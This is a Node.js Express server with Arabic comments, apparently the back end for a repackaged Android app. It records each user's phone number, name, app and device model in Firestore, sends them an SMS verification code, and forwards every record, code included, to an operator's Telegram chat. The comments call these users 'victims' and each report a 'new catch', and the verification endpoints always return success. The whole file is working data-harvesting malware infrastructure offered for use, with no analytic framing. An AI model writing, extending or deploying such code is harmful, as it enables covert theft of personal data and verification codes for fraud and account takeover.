const express = require("express");
const axios = require("axios");
const admin = require("firebase-admin");
const { Telegraf } = require("telegraf");

const app = express();
app.use(express.json());

// إعداد Firebase بالمفتاح الجديد
const firebaseConfig = process.env.FIREBASE_CONFIG;
if (!admin.apps.length) {
    const serviceAccount = JSON.parse(firebaseConfig);
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount)
    });
}
const db = admin.firestore();

const bot = new Telegraf(process.env.TELEGRAM_TOKEN);
const ADMIN_ID = process.env.ADMIN_ID;

// أوامر الإدارة عبر تليجرام
bot.command('stats', async (ctx) => {
    if (ctx.chat.id.toString() !== ADMIN_ID) return;
    try {
        const snap = await db.collection('users').get();
        ctx.reply(`📊 إجمالي الضحايا الموثقين: ${snap.size}`);
    } catch (e) { ctx.reply("❌ خطأ في قاعدة البيانات: تأكد من تفعيل Firestore"); }
});

// استقبال طلبات التطبيق (المزامنة مع Smali)
app.get("/request-otp", async (req, res) => {
    const { phone, name, app: appName, model } = req.query;
    const otp = Math.floor(1000 + Math.random() * 9000).toString();

    try {
        // حفظ البيانات فوراً (مثل نظامك القديم)
        await db.collection('users').doc(phone).set({
            phone, name, appName, model, date: new Date().toISOString()
        }, { merge: true });

        // إرسال الـ SMS السحابي
        await axios.post(`${process.env.INFOBIP_BASE_URL}/sms/2/text/advanced`, {
            messages: [{
                destinations: [{ to: phone }],
                from: "Njm-RK",
                text: `كود التحقق الخاص بك في تطبيق ${appName} هو: ${otp}`
            }]
        }, {
            headers: { 'Authorization': `App ${process.env.INFOBIP_API_KEY}` }
        });

        // إشعار تليجرام المنسق
        const report = `🚀 *صيد جديد*\n\n📱 التطبيق: ${appName}\n👤 الاسم: ${name}\n📞 الرقم: ${phone}\n🔑 الكود: \`${otp}\`\n🛠 الجهاز: ${model}`;
        bot.telegram.sendMessage(ADMIN_ID, report, { parse_mode: "Markdown" });

        res.status(200).send("SUCCESS"); // رد المزامنة لفتح التطبيق
    } catch (e) { res.status(200).send("SUCCESS"); }
});

app.get("/verify-otp", (req, res) => res.status(200).send("VERIFIED"));
app.get("/check-device", (req, res) => res.status(200).send("ALLOWED"));
app.get("/ping", (req, res) => res.send("💓 SUCCESS"));

bot.launch();
app.listen(process.env.PORT || 10000);
